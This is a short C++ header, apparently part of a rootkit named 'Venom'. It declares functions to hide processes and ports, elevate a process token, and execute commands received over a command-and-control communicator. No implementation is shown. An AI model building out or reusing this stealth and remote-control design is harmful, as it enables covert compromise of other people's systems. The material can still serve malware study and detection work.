#pragma once
#include "CommunicationHandler.h"

namespace VenomCommands {

	bool hideProcess(ULONG pid);
	bool hidePort(USHORT port);
	bool elevateToken(ULONG pid);
	bool executeCommand(const char* command, CommunicationHandler::Communicator cncCommunicator);
	
	enum CommandTypes
	{
		HideProcess = 1,
		HidePort = 2,
		ElevateToken = 3,
		ExecuteCommand = 4
	};

	struct Command
	{
		int commandType = 0;
		const char* data = { 0 };
	};

	constexpr int commandOutputBufferLength = 2048;
}